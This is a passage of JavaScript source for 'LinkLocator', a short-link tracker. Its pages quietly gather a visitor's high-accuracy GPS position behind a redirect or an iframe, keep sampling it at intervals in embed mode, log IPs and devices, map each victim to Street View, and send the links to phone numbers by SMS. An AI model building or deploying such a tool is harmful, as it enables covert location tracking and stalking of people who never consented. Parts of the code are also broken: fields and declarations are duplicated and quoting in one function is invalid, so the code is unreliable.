${isEmbed ? `#frame{position:fixed;inset:0;width:100%;height:100%;border:none;}` : `body{display:flex;align-items:center;justify-content:center;height:100vh;font-size:0.9rem;}`}
${isEmbed ? `#loading{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;font-size:0.9rem;z-index:10;}` : ``}
</style></head>
<body>
${isEmbed ? `<div id="loading"><p>Loading…</p></div><iframe id="frame" src="${destEsc}" sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-top-navigation-by-user-activation" loading="lazy"></iframe>` : `<p>Redirecting…</p>`}
<noscript><meta http-equiv="refresh" content="0;url=${destEsc}"><p style="margin-top:1rem;text-align:center;">JavaScript is disabled. <a href="${destEsc}">Click here to continue</a>.</p></noscript>
<script>
const SLUG = ${JSON.stringify(slug).replace(/<\/script/gi, '<\\/script')};
const DEST = ${JSON.stringify(destination).replace(/<\/script/gi, '<\\/script')};
const MODE = ${JSON.stringify(trackingMode).replace(/<\/script/gi, '<\\/script')};
let redirected = false;
const GPS_TIMEOUT = 3000;

function postClick(data) {
  const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
  return fetch('/api/click', { method: 'POST', body: blob, keepalive: true })
    .then(r => r.json())
    .then(r => { CLICK_ID = r.click_id || null; return r; })
    .catch(() => ({}));
}

function redirect() {
  if (redirected) return;
  redirected = true;
  window.location.replace(DEST);
}

${isEmbed ? `
// Embed mode: post click, then start GPS watch
let clickPosted = false;
function postAndTrack(gpsData) {
  if (clickPosted) return;
  clickPosted = true;
  postClick(gpsData ? { slug: SLUG, ...gpsData } : { slug: SLUG }).then(() => {
    document.getElementById('loading').style.display = 'none';
    startTracking();
  });
}
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    pos => postAndTrack({ gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude, gps_accuracy: pos.coords.accuracy }),
    () => postAndTrack(null),
    { enableHighAccuracy: true, timeout: GPS_TIMEOUT, maximumAge: 0 }
  );
  setTimeout(() => postAndTrack(null), GPS_TIMEOUT + 500);
} else {
  postAndTrack(null);
}` : `
// Redirect mode: post click + redirect
let clickPosted = false;
function postAndRedirect(gpsData) {
  if (!clickPosted) {
    clickPosted = true;
    const blob = new Blob([JSON.stringify(gpsData ? { slug: SLUG, ...gpsData } : { slug: SLUG })], { type: 'application/json' });
    if (navigator.sendBeacon) { navigator.sendBeacon('/api/click', blob); }
    else { fetch('/api/click', { method: 'POST', body: blob, keepalive: true }).catch(() => {}); }
  }
  redirect();
}
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    pos => postAndRedirect({ gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude, gps_accuracy: pos.coords.accuracy }),
    () => postAndRedirect(null),
    { enableHighAccuracy: true, timeout: GPS_TIMEOUT, maximumAge: 0 }
  );
  setTimeout(() => postAndRedirect(null), GPS_TIMEOUT + 500);
} else {
  postAndRedirect(null);
}`}
${pingJS}
</script>
</body></html>`;
}

function dashboardHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LinkLocator — Link Tracker</title>
<style>
  :root {
    --bg: #0f1117; --surface: #1a1d27; --border: #2a2d3a;
    --text: #e4e4e7; --muted: #71717a;
    --accent: #6366f1; --accent-hover: #818cf8;
    --green: #22c55e; --red: #ef4444;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
  .container { max-width: 1100px; margin: 0 auto; padding: 2rem; }
  header { margin-bottom: 2rem; }
  header h1 { font-size: 1.5rem; font-weight: 700; display: flex; align-items: center; gap: 0.5rem; }
  header h1 span { color: var(--accent); }
  header p { color: var(--muted); margin-top: 0.25rem; font-size: 0.875rem; }
  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 1.25rem; margin-bottom: 1rem; }
  .form-row { display: flex; gap: 0.75rem; flex-wrap: wrap; align-items: flex-end; }
  .form-group { display: flex; flex-direction: column; flex: 1; min-width: 180px; }
  .form-group label { font-size: 0.75rem; color: var(--muted); margin-bottom: 0.35rem; font-weight: 500; text-transform: uppercase; letter-spacing: 0.05em; }
  input, button { font-size: 0.875rem; border-radius: 8px; border: 1px solid var(--border); background: var(--bg); color: var(--text); padding: 0.6rem 0.75rem; outline: none; transition: border-color 0.2s; }
  input:focus { border-color: var(--accent); }
  input::placeholder { color: var(--muted); }
  button { cursor: pointer; border: none; font-weight: 600; white-space: nowrap; }
  .btn-primary { background: var(--accent); color: #fff; }
  .btn-primary:hover { background: var(--accent-hover); }
  .btn-sm { padding: 0.35rem 0.7rem; font-size: 0.75rem; border-radius: 6px; }
  .btn-danger { background: var(--red); color: #fff; }
  .btn-danger:hover { background: #dc2626; }
  .btn-muted { background: var(--border); color: var(--muted); }
  .btn-muted:hover { background: #3a3d4a; color: var(--text); }
  .links-table { width: 100%; border-collapse: collapse; }
  .links-table th { text-align: left; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.06em; color: var(--muted); padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border); font-weight: 600; }
  .links-table td { padding: 0.75rem; border-bottom: 1px solid var(--border); font-size: 0.85rem; vertical-align: middle; }
  .links-table tr:hover td { background: rgba(99,102,241,0.04); }
  .slug { font-family: monospace; color: var(--accent); font-weight: 600; }
  .short-url { font-family: monospace; font-size: 0.78rem; color: var(--accent-hover); cursor: pointer; }
  .short-url:hover { text-decoration: underline; }
  .destination { color: var(--muted); max-width: 280px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; display: inline-block; font-size: 0.8rem; }
  .click-count { font-weight: 700; font-size: 1rem; }
  .badge { display: inline-block; padding: 0.15rem 0.5rem; border-radius: 999px; font-size: 0.65rem; font-weight: 700; text-transform: uppercase; }
  .badge-active { background: rgba(34,197,94,0.15); color: var(--green); }
  .badge-inactive { background: rgba(239,68,68,0.15); color: var(--red); }
  .actions { display: flex; gap: 0.35rem; }
  .empty-state { text-align: center; color: var(--muted); padding: 3rem 1rem; }
  .empty-state .icon { font-size: 2rem; margin-bottom: 0.75rem; }
  .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; display: none; align-items: center; justify-content: center; }
  .modal-overlay.open { display: flex; }
  .modal { background: var(--surface); border: 1px solid var(--border); border-radius: 16px; width: 95%; max-width: 720px; max-height: 90vh; overflow-y: auto; padding: 1.5rem; }
  .modal h2 { font-size: 1.1rem; margin-bottom: 1rem; }
  .modal .close-btn { float: right; background: none; border: none; color: var(--muted); font-size: 1.2rem; cursor: pointer; }
  .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 0.75rem; margin-bottom: 1rem; }
  .stat-box { background: var(--bg); border-radius: 8px; padding: 0.75rem; text-align: center; }
  .stat-box .val { font-size: 1.25rem; font-weight: 700; }
  .stat-box .lbl { font-size: 0.65rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.05em; margin-top: 0.2rem; }
  .clicks-table { width: 100%; border-collapse: collapse; font-size: 0.75rem; }
  .clicks-table th { text-align: left; color: var(--muted); font-size: 0.65rem; text-transform: uppercase; padding: 0.4rem 0.5rem; border-bottom: 1px solid var(--border); }
  .clicks-table td { padding: 0.4rem 0.5rem; border-bottom: 1px solid var(--border); color: var(--muted); }
  .copied-toast { position: fixed; bottom: 2rem; right: 2rem; background: var(--green); color: #fff; padding: 0.6rem 1rem; border-radius: 8px; font-size: 0.8rem; font-weight: 600; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 200; }
  .copied-toast.show { opacity: 1; }
  .bar-chart { display: flex; flex-direction: column; gap: 2px; margin-bottom: 1rem; }
  .bar-row { display: flex; align-items: center; gap: 0.5rem; font-size: 0.7rem; }
  .bar-label { width: 120px; text-align: right; color: var(--muted); flex-shrink: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .bar-fill { height: 16px; background: var(--accent); border-radius: 3px; min-width: 2px; }
  .bar-value { color: var(--muted); }
</style>
</head>
<body>
<div class="container">
  <header>
    <h1>🔗 <span>Link</span>Locator</h1>
    <p>Create tracked short links. Monitor every click — IP, location, referrer, device. <button onclick="whoami()" class="btn-sm btn-muted" style="margin-left:0.5rem;">🌐 My IP</button></p>
  </header>
  <div class="card">
    <form id="createForm" class="form-row">
      <div class="form-group" style="flex:2">
        <label>Destination URL</label>
        <input type="url" id="destInput" placeholder="https://example.com/your-page" required>
      </div>
      <div class="form-group">
        <label>Custom Slug (optional)</label>
        <input type="text" id="slugInput" placeholder="my-link">
      </div>
      <div class="form-group">
        <label>Label (optional)</label>
        <input type="text" id="labelInput" placeholder="Campaign name">
      </div>
      <div class="form-group" style="flex:0.6;min-width:120px;"><label>Tracking</label><select id="trackingInput" style="font-size:0.875rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);padding:0.6rem 0.75rem;"><option value="redirect">Redirect</option><option value="embed">Embed + GPS</option></select></div><div class="form-group" style="flex:0.4;min-width:70px;"><label>GPS every (s)</label><input type="number" id="intervalInput" value="30" min="5" max="3600" placeholder="30"></div><div class="form-group" style="flex:0.6;min-width:120px;"><label>Tracking</label><select id="trackingInput" style="font-size:0.875rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);padding:0.6rem 0.75rem;"><option value="redirect">Redirect</option><option value="embed">Embed + GPS</option></select></div><div class="form-group" style="flex:0.4;min-width:70px;"><label>GPS every (s)</label><input type="number" id="intervalInput" value="30" min="5" max="3600" placeholder="30"></div><button type="submit" class="btn-primary" style="height:38px;margin-bottom:1px;">Create Link</button>
    </form>
  </div>
  <div class="card" id="linksCard">
    <table class="links-table">
      <thead><tr><th>Short Link</th><th>Destination</th><th>Label</th><th>Clicks</th><th>Status</th><th>Created</th><th></th></tr></thead>
      <tbody id="linksBody"></tbody>
    </table>
    <div id="emptyState" class="empty-state" style="display:none;"><div class="icon">📭</div><div>No links yet. Create one above!</div></div>
  </div>
</div>
<div class="modal-overlay" id="modalOverlay"><div class="modal" id="modalContent"></div></div>
<div class="modal-overlay" id="smsModal" onclick="if(event.target===this)closeSmsModal()">
  <div class="modal" style="max-width:500px;">
    <button class="close-btn" onclick="closeSmsModal()">✕</button>
    <h2>📱 Send via Text</h2>
    <p style="color:var(--muted);font-size:0.8rem;margin-bottom:1rem;" id="smsLinkPreview"></p>
    <div style="margin-bottom:0.75rem;">
      <label style="font-size:0.75rem;color:var(--muted);font-weight:500;text-transform:uppercase;letter-spacing:0.05em;">Phone Numbers</label>
      <textarea id="smsNumbers" rows="4" placeholder="+15551234567&#10;+15559876543&#10;Or comma-separated" style="width:100%;margin-top:0.35rem;font-size:0.85rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);padding:0.6rem 0.75rem;resize:vertical;font-family:monospace;"></textarea>
    </div>
    <div style="margin-bottom:0.75rem;">
      <label style="font-size:0.75rem;color:var(--muted);font-weight:500;text-transform:uppercase;letter-spacing:0.05em;">Custom Message (optional)</label>
      <input type="text" id="smsMessage" maxlength="1600" placeholder="Check this out: {link}" style="width:100%;margin-top:0.35rem;">
      <div style="font-size:0.65rem;color:var(--muted);margin-top:0.25rem;">Use <code>{link}</code> as placeholder for the short URL. Leave blank for default.</div>
    </div>
    <button class="btn-primary" style="width:100%;" onclick="doSendSMS()">Send Texts</button>
    <div id="smsResult" style="margin-top:0.75rem;font-size:0.8rem;"></div>
  </div>
</div>
<div class="copied-toast" id="toast">Copied!</div>
<script>
async function api(m,p,b){const o={method:m,headers:{'Content-Type':'application/json'}};if(b)o.body=JSON.stringify(b);try{const r=await fetch(p,o);const t=await r.text();try{return JSON.parse(t);}catch{return {error:'Server returned non-JSON: '+r.status};}}catch(e){return {error:'Network error: '+e.message};}}
function showToast(m){const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');clearTimeout(t._tid);t._tid=setTimeout(()=>t.classList.remove('show'),2500);}
function copyUrl(u){try{navigator.clipboard.writeText(u);}catch{const t=document.createElement('textarea');t.value=u;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);}showToast('Copied!');}
function esc(s){if(!s)return'';const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
function fmtDate(d){if(!d)return'—';try{return new Date(d).toLocaleDateString(undefined,{month:'short',day:'numeric',year:'numeric'});}catch{return d;}}
function fmtDT(d){if(!d)return'—';try{return new Date(d).toLocaleString(undefined,{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});}catch{return d;}}
function flagEmoji(c){if(!c||c==='Local'||c.length!==2)return '📍';try{const code=c.toUpperCase();let out='';for(let i=0;i<code.length;i++)out+=String.fromCodePoint(127397+code.charCodeAt(i));return out;}catch{return '🌐';}}
async function loadLinks(){
  const links=await api('GET','/api/links');
  const tbody=document.getElementById('linksBody');
  const empty=document.getElementById('emptyState');
  if(links.error){tbody.innerHTML='';empty.style.display='block';empty.textContent='Error: '+links.error;return;}
  if(!links.length){tbody.innerHTML='';empty.style.display='block';empty.textContent='No links yet. Create one above!';return;}
  empty.style.display='none';
  tbody.innerHTML=links.map(l=>\`<tr>
    <td><span class="slug">/\${esc(l.slug)}</span><br><span class="short-url" data-url="\${location.origin}/\${esc(l.slug)}" onclick="copyUrl(this.dataset.url)">\${location.origin}/\${l.slug}</span></td>
    <td><span class="destination" title="\${esc(l.destination)}">\${esc(l.destination)}</span></td>
    <td>\${esc(l.label)||'<span style="color:var(--muted)">—</span>'}</td>
    <td><span class="click-count">\${l.click_count}</span></td>
    <td><span class="badge \${l.active?'badge-active':'badge-inactive'}">\${l.active?'Active':'Paused'}</span>'+(l.tracking_mode==='embed'?' <span style="font-size:0.6rem;color:var(--green);">📡 Live</span>':'')</span>'+(l.tracking_mode==='embed'?' <span style="font-size:0.6rem;color:var(--green);">📡 Live</span>':'')</span></td>
    <td>\${fmtDate(l.created_at)}</td>
    <td class="actions">
      <button class="btn-sm btn-primary" data-slug="\${esc(l.slug)}" onclick="viewDetail(this.dataset.slug)">Details</button>
      <button class="btn-sm" style="background:#2563eb;color:#fff;" data-slug="\${esc(l.slug)}" data-url="\${location.origin}/\${esc(l.slug)}" onclick="sendSMS(this.dataset.slug,this.dataset.url)">Text</button>
      <button class="btn-sm btn-muted" data-slug="\${esc(l.slug)}" onclick="toggleLink(this.dataset.slug)">\${l.active?'Pause':'Resume'}</button>
      <button class="btn-sm btn-danger" data-slug="\${esc(l.slug)}" onclick="deleteLink(this.dataset.slug)">Delete</button>
    </td></tr>\`).join('');
}
document.getElementById('createForm').addEventListener('submit',async e=>{
  e.preventDefault();
  const dest=document.getElementById('destInput').value;
  const slug=document.getElementById('slugInput').value||undefined;
  const label=document.getElementById('labelInput').value||undefined;const tracking_mode=document.getElementById('trackingInput').value;const gps_interval=parseInt(document.getElementById('intervalInput').value)||30;const tracking_mode=document.getElementById('trackingInput').value;const gps_interval=parseInt(document.getElementById('intervalInput').value)||30;
  try{const r=await api('POST','/api/links',{destination:dest,slug,label,tracking_mode,gps_interval});if(r.error){showToast('Error: '+r.error);return;}
  document.getElementById('destInput').value='';document.getElementById('slugInput').value='';document.getElementById('labelInput').value='';
  showToast('Link created!');if(r.iframe_warning)setTimeout(()=>showToast('⚠️ '+r.iframe_warning),2600);loadLinks();}catch(e){showToast('Error creating link');}
});
async function toggleLink(s){const r=await api('PATCH','/api/links/'+s+'/toggle');if(r.error)showToast('Error: '+r.error);else loadLinks();}
async function deleteLink(s){if(!confirm('Delete this link and all click data?'))return;const r=await api('DELETE','/api/links/'+s);if(r.error)showToast('Error: '+r.error);else loadLinks();}
async function viewDetail(slug){
  const data=await api('GET','/api/links/'+slug);
  if(data.error){showToast(data.error);return;}
  const st=data.stats||{};
  const maxDay=Math.max(...(data.by_day||[]).map(d=>d.count),1);
  const dayBars=(data.by_day||[]).slice(0,14).reverse().map(d=>'<div class="bar-row"><span class="bar-label">'+d.day.slice(5)+'</span><div class="bar-fill" style="width:'+(d.count/maxDay*100).toFixed(1)+'%"></div><span class="bar-value">'+d.count+'</span></div>').join('');
  const cRows=(data.recent_clicks||[]).slice(0,50).map(c=>{const gps=c.gps_accuracy!=null;const hasCoords=c.lat!=null&&c.lon!=null;const locStr=hasCoords?'<a href="#" onclick="showStreetView('+c.lat+','+c.lon+');return false;" style="color:var(--accent);cursor:pointer;text-decoration:none;">'+(gps?'<span style="color:var(--green);">📡 GPS</span> '+(c.lat.toFixed(4)+', '+c.lon.toFixed(4))+' <span style="color:var(--muted);font-size:0.55rem;">\u00B1'+Math.round(c.gps_accuracy)+'m</span>':flagEmoji(c.country)+' '+(esc(c.city)||'—')+', '+(esc(c.region)||'—')+' <span style="color:var(--muted);font-size:0.6rem;">('+(esc(c.country)||'?')+')</span>')+' 🏠</a>':(gps?'<span style="color:var(--green);">📡 GPS</span> —':flagEmoji(c.country)+' '+(esc(c.city)||'—')+', '+(esc(c.region)||'—')+' <span style="color:var(--muted);font-size:0.6rem;">('+(esc(c.country)||'?')+')</span>');return '<tr><td>'+fmtDT(c.clicked_at)+'</td><td>'+esc(c.ip)+'</td><td>'+locStr+'</td><td title="'+esc(c.user_agent)+'">'+esc((c.user_agent||'').slice(0,35))+'</td><td title="'+esc(c.referrer)+'">'+(esc((c.referrer||'').slice(0,25))||'Direct')+'</td></tr>';}).join('');
  let countryBars='',cityBars='';
  if(data.by_country&&data.by_country.length){const mx=Math.max(...data.by_country.map(x=>x.count),1);countryBars='<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">By Country</h3><div class="bar-chart">'+data.by_country.map(d=>'<div class="bar-row"><span class="bar-label">'+flagEmoji(d.country)+' '+esc(d.country)+'</span><div class="bar-fill" style="width:'+(d.count/mx*100).toFixed(1)+'%"></div><span class="bar-value">'+d.count+'</span></div>').join('')+'</div>';}
  if(data.by_city&&data.by_city.length){const mx=Math.max(...data.by_city.map(x=>x.count),1);cityBars='<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">By City</h3><div class="bar-chart">'+data.by_city.map(d=>'<div class="bar-row"><span class="bar-label">'+esc(d.city)+'</span><div class="bar-fill" style="width:'+(d.count/mx*100).toFixed(1)+'%"></div><span class="bar-value">'+d.count+'</span></div>').join('')+'</div>';}
  document.getElementById('modalContent').innerHTML=
    '<button class="close-btn" onclick="closeModal()">✕</button>'+
    '<h2>📊 <span class="slug">/'+esc(data.slug)+'</span></h2>'+
    '<p style="color:var(--muted);font-size:0.8rem;margin-bottom:1rem;">→ '+esc(data.destination)+'</p>'+
    '<div class="stat-grid">'+
      '<div class="stat-box"><div class="val">'+(st.total||0)+'</div><div class="lbl">Total Clicks</div></div>'+
      '<div class="stat-box"><div class="val">'+(st.unique_ips||0)+'</div><div class="lbl">Unique IPs</div></div>'+
      '<div class="stat-box"><div class="val">'+fmtDate(st.first_click)+'</div><div class="lbl">First Click</div></div>'+
      '<div class="stat-box"><div class="val">'+fmtDate(st.last_click)+'</div><div class="lbl">Last Click</div></div>'+
    '</div>'+
    (dayBars?'<h3 style="font-size:0.8rem;margin-bottom:0.5rem;">Clicks by Day</h3><div class="bar-chart">'+dayBars+'</div>':'')+
    countryBars+cityBars+
    '<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">Recent Clicks</h3>'+
    '<div style="overflow-x:auto;"><table class="clicks-table"><thead><tr><th>Time</th><th>IP</th><th>Location</th><th>Device</th><th>Referrer</th></tr></thead><tbody>'+(cRows||'<tr><td colspan="5" style="text-align:center;padding:1rem;">No clicks yet</td></tr>')+'</tbody></table></div>'+
    '<div id="streetViewPanel" style="display:none;margin-top:1rem;"><h3 style="font-size:0.8rem;margin:0 0 0.5rem;">🏠 Street View</h3><iframe id="streetViewFrame" style="width:100%;height:300px;border:1px solid var(--border);border-radius:10px;" sandbox="allow-scripts allow-popups" allowfullscreen loading="lazy"></iframe><div style="font-size:0.65rem;color:var(--muted);margin-top:0.3rem;">Click any 🏠 location above to view</div></div>';
  document.getElementById('modalOverlay').classList.add('open');
}
function closeModal(){document.getElementById('modalOverlay').classList.remove('open');}
function showStreetView(lat,lon){
  const p=document.getElementById('streetViewPanel');
  const f=document.getElementById('streetViewFrame');
  p.style.display='block';
  f.src='https://www.google.com/maps?q='+lat+','+lon+'&layer=c&output=svembed';
  p.scrollIntoView({behavior:'smooth',block:'nearest'});
}
document.getElementById('modalOverlay').addEventListener('click',e=>{if(e.target===e.currentTarget)closeModal();});
document.addEventListener('keydown',e=>{if(e.key==='Escape'){closeSmsModal();closeModal();}});
loadLinks();
async function whoami(){const d=await api("GET","/api/whoami");const g=d.geo||{};const mc=document.getElementById("modalContent");const ip=d.ip_seen||"?";mc.innerHTML="<button class="close-btn" onclick="closeModal()">✕</button><h2>🌐 My IP Info</h2><div class="stat-grid"><div class="stat-box"><div class="val" style="font-size:0.85rem;font-family:monospace;word-break:break-all;">"+esc(ip)+"</div><div class="lbl">IP Address</div></div><div class="stat-box"><div class="val">"+flagEmoji(g.country)+" "+(esc(g.city)||"—")+"</div><div class="lbl">City</div></div><div class="stat-box"><div class="val">"+(esc(g.region)||"—")+"</div><div class="lbl">Region</div></div><div class="stat-box"><div class="val">"+(esc(g.country)||"—")+"</div><div class="lbl">Country</div></div><div class="stat-box"><div class="val">"+(esc(g.isp)||"—")+"</div><div class="lbl">ISP</div></div><div class="stat-box"><div class="val">"+(g.lat!=null?g.lat.toFixed(6):"—")+", "+(g.lon!=null?g.lon.toFixed(6):"—")+"</div><div class="lbl">Lat, Lon</div></div></div>"+(d.hint?"<p style="color:var(--muted);font-size:0.75rem;margin-top:0.5rem;">⚠️ "+esc(d.hint)+"</p>":"")+(d.forwarded_for?"<p style="color:var(--muted);font-size:0.7rem;margin-top:0.5rem;">X-Forwarded-For: "+esc(d.forwarded_for)+"</p>":"");document.getElementById("modalOverlay").classList.add("open");}
function sendSMS(slug,url){document.getElementById('smsLinkPreview').textContent='Short URL: '+url;document.getElementById('smsLinkPreview').dataset.slug=slug;document.getElementById('smsNumbers').value='';document.getElementById('smsMessage').value='';document.getElementById('smsResult').innerHTML='';document.getElementById('smsModal').classList.add('open');}
function closeSmsModal(){document.getElementById('smsModal').classList.remove('open');}
async function doSendSMS(){const nums=document.getElementById('smsNumbers').value.trim();if(!nums){showToast('Enter at least one phone number');return;}const to=nums.includes('\n')?nums.split('\n').map(s=>s.trim()).filter(Boolean):nums.split(',').map(s=>s.trim()).filter(Boolean);const msg=document.getElementById('smsMessage').value.trim()||undefined;const slug=document.getElementById('smsLinkPreview').dataset.slug;const rd=document.getElementById('smsResult');rd.innerHTML='Sending\u2026';const r=await api('POST','/api/links/'+slug+'/sms',{to,message:msg});if(r.error){rd.innerHTML='<span style="color:var(--red)">Error: '+esc(r.error)+'</span>';return;}rd.innerHTML='<span style="color:var(--green)">\u2705 '+r.sent+' sent'+(r.failed?', '+r.failed+' failed':'')+'</span>';}
</script>

</body></html>`;
}

main().catch(console.error);

// Guard against unhandled rejections crashing the process silently
process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection:", reason);
});
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
  // Give logs time to flush, then exit — process manager will restart
  setTimeout(() => process.exit(1), 100);
});
